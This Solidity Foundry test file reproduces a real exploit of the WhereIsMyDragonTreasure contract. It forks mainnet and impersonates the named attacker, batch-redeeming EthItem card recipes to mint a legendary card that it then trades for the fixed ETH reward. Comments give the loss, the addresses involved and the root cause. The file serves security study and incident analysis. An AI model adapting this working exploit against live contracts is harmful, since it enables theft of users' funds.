// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : $47,461.35
// Attacker : 0x8b88A3b92433638324E5f429bEe52b1fd84E7c5a
// Attack Contract : 0xd73c37d235b6032b21ADAF7F6dE73BDbc31667B2
// Vulnerable Contract : 0x32c87193C2cC9961F2283FcA3ca11A483d8E426B
// Attack Tx : https://etherscan.io/tx/0x2154dd30d2bdd53b233d862ecd665c3a69c7a849cb498b724f622d9cb42771fc
//
// @Info
// WhereIsMyDragon : https://etherscan.io/address/0x87AD9009C4Fd0AAa7bFE74f7E00845B3f09aD0CE#code
// WhereIsMyDragonTreasure : https://etherscan.io/address/0x32c87193C2cC9961F2283FcA3ca11A483d8E426B#code
//
// @Analysis
// Telegram Alert : https://t.me/defimon_alerts/1537
//
// Attack summary: The attacker used EthItem recipe redemptions to mint one legendary card wrapper, then sent it to
// WhereIsMyDragonTreasure to redeem the configured fixed ETH reward.
// Root cause: WhereIsMyDragonTreasure paid a fixed `_singleReward` for each received legendary card, allowing the
// attacker to convert existing recipe wrapper balances into a full reward payout.

interface IEthItemERC1155 {
    function safeBatchTransferFrom(
        address from,
        address to,
        uint256[] calldata ids,
        uint256[] calldata amounts,
        bytes calldata data
    ) external;

    function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes calldata data) external;
}

interface IERC20View {
    function balanceOf(address account) external view returns (uint256);
}

interface IWhereIsMyDragonTreasure {
    function data() external view returns (uint256 balance, uint256 singleReward, uint256 startBlock, uint256 redeemed);
}

contract ContractTest is BaseTestWithBalanceLog {
    address private constant ATTACKER = 0x8b88A3b92433638324E5f429bEe52b1fd84E7c5a;
    address private constant DRAGON = 0x87AD9009C4Fd0AAa7bFE74f7E00845B3f09aD0CE;
    address private constant TREASURE = 0x32c87193C2cC9961F2283FcA3ca11A483d8E426B;
    IEthItemERC1155 private constant ETH_ITEM = IEthItemERC1155(0xb6ab68A44eCc9fb2244AaB83eB2f6dbA54205EBf);

    address private constant CARD_C2C566 = 0xc2c5667f69E881C83Fc4692f7A08a22370B4cc41;
    address private constant CARD_E63983 = 0xE63983b5FAdE429eC052d1b365826C4Bc5fCB198;
    address private constant CARD_7C23AC = 0x7C23Ac2E8DA915d4f422CF710f4767FAa0c332fa;
    address private constant CARD_A70C86 = 0xA70C8667cCFB63D6b98C2A050c94b7Bf2085dC55;
    address private constant CARD_9B16E7 = 0x9b16e70797276Ae1bE23874961D1E6a9698e1EC6;
    address private constant CARD_88B953 = 0x88B95322b5E93B891D83031F2f55Ca238D5e6417;
    address private constant LEGENDARY_CARD = 0x22e6559F495F97Af51fF56719CdFF80F65a0B93A;

    uint256 private constant FORK_BLOCK = 23_000_243;
    uint256 private constant SINGLE_REWARD = 12_775_839_441_940_405_641;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);

        fundingToken = address(0);
        attacker = ATTACKER;

        vm.label(ATTACKER, "attacker");
        vm.label(DRAGON, "WhereIsMyDragon");
        vm.label(TREASURE, "WhereIsMyDragonTreasure");
        vm.label(address(ETH_ITEM), "EthItem ERC1155");
        vm.label(LEGENDARY_CARD, "legendary card wrapper");
    }

    function testExploit() public balanceLog {
        (, uint256 singleReward, uint256 startBlock,) = IWhereIsMyDragonTreasure(TREASURE).data();
        assertEq(singleReward, SINGLE_REWARD, "unexpected configured reward");
        assertGe(block.number, startBlock, "redeem period not started");

        uint256 ethBefore = ATTACKER.balance;
        uint256 legendaryBefore = IERC20View(LEGENDARY_CARD).balanceOf(ATTACKER);

        vm.startPrank(ATTACKER);
        for (uint256 i = 0; i < 15; i++) {
            _sendRecipeA();
        }
        for (uint256 i = 0; i < 7; i++) {
            _sendRecipeB();
        }
        _sendRecipeC();

        assertEq(IERC20View(LEGENDARY_CARD).balanceOf(ATTACKER), legendaryBefore + 1 ether, "legendary card not minted");
        ETH_ITEM.safeTransferFrom(ATTACKER, TREASURE, _id(LEGENDARY_CARD), 1, "");
        vm.stopPrank();

        assertEq(ATTACKER.balance - ethBefore, SINGLE_REWARD, "ETH reward mismatch");
        assertEq(IERC20View(LEGENDARY_CARD).balanceOf(ATTACKER), legendaryBefore, "legendary card not burned");
    }

    function _sendRecipeA() private {
        _sendBatch(_id(CARD_C2C566), _id(CARD_E63983), _id(CARD_7C23AC), 99, 44, 10);
    }

    function _sendRecipeB() private {
        _sendBatch(_id(CARD_A70C86), _id(CARD_7C23AC), _id(CARD_9B16E7), 200, 346, 2);
    }

    function _sendRecipeC() private {
        _sendBatch(_id(CARD_C2C566), _id(CARD_9B16E7), _id(CARD_88B953), 60, 3, 9);
    }

    function _sendBatch(
        uint256 id0,
        uint256 id1,
        uint256 id2,
        uint256 amount0,
        uint256 amount1,
        uint256 amount2
    ) private {
        uint256[] memory ids = new uint256[](3);
        ids[0] = id0;
        ids[1] = id1;
        ids[2] = id2;

        uint256[] memory amounts = new uint256[](3);
        amounts[0] = amount0;
        amounts[1] = amount1;
        amounts[2] = amount2;

        ETH_ITEM.safeBatchTransferFrom(ATTACKER, DRAGON, ids, amounts, "");
    }

    function _id(address wrapper) private pure returns (uint256) {
        return uint256(uint160(wrapper));
    }
}
